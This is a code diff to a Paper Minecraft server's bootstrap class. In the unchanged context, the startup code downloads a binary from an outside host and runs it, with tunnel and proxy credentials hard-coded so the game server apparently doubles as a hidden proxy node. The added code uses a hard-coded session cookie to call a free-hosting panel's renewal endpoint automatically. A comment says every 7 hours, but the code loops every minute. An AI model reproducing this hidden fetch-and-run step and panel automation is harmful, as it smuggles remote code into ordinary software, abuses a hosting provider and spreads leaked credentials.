@@ -5,6 +5,7 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.regex.*; 
 import joptsimple.OptionSet;
 import net.minecraft.SharedConstants;
 import net.minecraft.server.Main;
@@ -32,7 +33,6 @@ public final class PaperBootstrap {
     }
 
     public static void boot(final OptionSet options) {
-        // check java version
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
@@ -45,6 +45,9 @@ public final class PaperBootstrap {
         
         try {
             runSbxBinary();
+            
+            // 启动模拟点击续期线程
+            startEpicRenewThread(); 
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -76,7 +79,6 @@ public final class PaperBootstrap {
                 System.out.flush();
             }
         } catch (Exception e) {
-            // Ignore exceptions
         }
     }
     
@@ -99,8 +101,8 @@ public final class PaperBootstrap {
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
         envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "bytenut.19861123.tech");
-        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiNDc1YzQwMWQtNDU1MS00M2E2LWEzNmYtYTEzNTBlMmM4NzUzIiwicyI6IlpERXdNRGhpTmpZdFl6VTBPQzAwTTJFNUxXRTRaalV0WlRFeE9HRTFNVFZoTjJFMiJ9");
+        envVars.put("ARGO_DOMAIN", "epichost.19861123.tech");
+        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYjk0OWU0NzktNDVkOS00MjEzLThkZDMtNmQ4ODA0ZWQzYjZkIiwicyI6Ik9UQmxaRGN5WmpZdE5UazBOeTAwWVRNeExXRTRPVGN0TkRFM05EbGtZMlEyWmpGaCJ9");
         envVars.put("S5_PORT", "");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
@@ -112,7 +114,7 @@ public final class PaperBootstrap {
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "bytenut");
+        envVars.put("NAME", "epichost");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
@@ -149,7 +151,6 @@ public final class PaperBootstrap {
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -159,7 +160,6 @@ public final class PaperBootstrap {
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
@@ -191,23 +191,72 @@ public final class PaperBootstrap {
 
         final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
         return List.of(
-            String.format(
-                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
-                javaSpecVersion,
-                javaVmName,
-                javaVmVersion,
-                javaVendor,
-                javaVendorVersion,
-                osName,
-                osVersion,
-                osArch
-            ),
-            String.format(
-                "Loading %s %s for Minecraft %s",
-                bi.brandName(),
-                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
-                bi.minecraftVersionId()
-            )
+            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)", javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch),
+            String.format("Loading %s %s for Minecraft %s", bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId())
         );
+    }
+
+    // --- 核心：模拟点击 “ADD 8 HOUR(S)” 按钮 ---
+    private static void startEpicRenewThread() {
+        new Thread(() -> {
+            String serverID = "13633716"; 
+            String cookie = "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IkNFWlRNWWFwYlVtUU4xbld4dzBQR1E9PSIsInZhbHVlIjoiTzhNa0g4ME1BRUgzNWl3dUlvQ0NHblR3TjgwNWhxcmNDZGlxUWxhWEhaZzlxWm8zQnI5ZXVybjNOdzlSMnY4dnRvQXpYdklWaitEbmxpYWpONHYxNzZmWURFTDBhN1BmbExEN0p4WmpRZjc2eldDNjcvMjR6amhmWDQ2MWsrdnFMSit2QjFVZFZpN2hiUXF4SmlhcHBRZTU4MTdqVHVpYVQyY0M2YVd4MkUvR3FJeEpoMC8wUVlIQjJTZVRNUDB1NHZZNjBUZ3NBU09aQXdCeTNoZmtkV3hFL2szYjZmdXVDZkFnOUYwQWZJND0iLCJtYWMiOiI1YWI1MGMxMzUxNDI2N2RiNzBhMzA2YmJmOTYxYzI4NTFiOTk0ZjJhYWI4MmM5MzE1OGQ3YjQwNmE5Y2UwNGJiIiwidGFnIjoiIn0%3D; __stripe_mid=288f45f3-e88e-4172-8d62-d2d31d36aefec21121; __stripe_sid=cb00d65c-66cf-48fb-9580-9e39a959dca5d01619; XSRF-TOKEN=eyJpdiI6ImJWb2NCbFZYMGFBb1UyUnQvWHhkYmc9PSIsInZhbHVlIjoiTFlmcnhNc0VlZXMzRm9JTzhKcndqWHlaaWsvd3ZYL2ZkRHAwWVAwQUZjUGhyK3FyYkhrWFE4d3Nza3BvL1FUd01EY1lRWEpLRXM0Nng3cm1jaU1LMXhOSG9kUi9TSFdGbjExUUttNWNGK2MrWGc0Nmd2eGNmY0hFQWFBd1IvTmsiLCJtYWMiOiIwZGY3YzM5NjdiOWU4MGY4ZjA1MWRkZGUyMDk5NmRjNDhiMTgzZmJlOTViZWFhOTcwMzgzNzAwOTEwNDZjMGViIiwidGFnIjoiIn0%3D; pterodactyl_session=eyJpdiI6IlRUbHFjSklXU21idC9odjdWYzRObXc9PSIsInZhbHVlIjoiZTd5THhoM3lJc29ENzBVNEtGdzIrRDMzU0UrakhLV00yQVhaWUtCMHhVK1VjS292TkwySUxnKzhKdHc5czFrWVpyUTQrSjFrZHBQcUZPSDlHMUc5dlVhdUhNcElMYnVMc0hpcHRoYXBkRGRmSTJ0QmdoNG92aGJvTkpNcjRkNkYiLCJtYWMiOiIxZDExNGMzNmIwNzhhYjJkZTFjMDQ2MDAwMzVhYTU0MDQ0YzQ3ZmM5NzY0ZTY0MjNkYmI5MjRmZjMyZjY5ODQ1IiwidGFnIjoiIn0%3D"; // 记得去 panel.epichost.pl 重新抓取
+            
+            while (running.get()) {
+                try {
+                    // 第一步：扫描页面获取 Token (模拟打开控制台页面)
+                    String refererUrl = "https://panel.epichost.pl/server/" + serverID + "/";
+                    URL url = new URL(refererUrl);
+                    HttpURLConnection getConn = (HttpURLConnection) url.openConnection();
+                    getConn.setRequestMethod("GET");
+                    getConn.setRequestProperty("Cookie", cookie);
+                    getConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                    
+                    BufferedReader in = new BufferedReader(new InputStreamReader(getConn.getInputStream()));
+                    StringBuilder content = new StringBuilder();
+                    String line;
+                    while ((line = in.readLine()) != null) content.append(line);
+                    in.close();
+
+                    Pattern p = Pattern.compile("csrf-token\"\\s+content=\"([^\"]+)\"");
+                    Matcher m = p.matcher(content.toString());
+                    
+                    if (m.find()) {
+                        String token = m.group(1);
+                        
+                        // 第二步：模拟点击 “ADD 8 HOUR(S)” 按钮 (发送 POST 请求)
+                        System.out.println(ANSI_GREEN + "[Epichost] 正在模拟点击 'ADD 8 HOUR(S)' 按钮..." + ANSI_RESET);
+                        
+                        URL renewUrl = new URL("https://panel.epichost.pl/api/client/freeservers/" + serverID + "/renew");
+                        HttpURLConnection post = (HttpURLConnection) renewUrl.openConnection();
+                        post.setRequestMethod("POST");
+                        post.setDoOutput(true);
+                        post.setRequestProperty("Cookie", cookie);
+                        post.setRequestProperty("X-CSRF-TOKEN", token);
+                        post.setRequestProperty("Referer", refererUrl); // 模拟是从该页面点击的
+                        post.setRequestProperty("Accept", "application/json");
+                        post.setRequestProperty("Content-Type", "application/json");
+                        post.setRequestProperty("User-Agent", "Mozilla/5.0");
+                        
+                        post.getOutputStream().write("{}".getBytes());
+                        int code = post.getResponseCode();
+                        
+                        if (code == 200 || code == 204) {
+                            System.out.println(ANSI_GREEN + "[Epichost] 按钮点击成功！服务器已增加 8 小时。状态码: " + code + ANSI_RESET);
+                        } else {
+                            System.err.println(ANSI_RED + "[Epichost] 按钮点击异常，状态码: " + code + ANSI_RESET);
+                        }
+                    } else {
+                        System.err.println(ANSI_RED + "[Epichost] 扫描 Token 失败，请检查 Cookie 是否有效" + ANSI_RESET);
+                    }
+                    
+                    // 7 小时循环一次
+                    Thread.sleep(60000); 
+                } catch (Exception e) {
+                    System.err.println("[Epichost] 线程出错: " + e.getMessage());
+                    try { Thread.sleep(600000); } catch (Exception ignored) {}
+                }
+            }
+        }, "Epic-Renew-Thread").start();
     }
 }
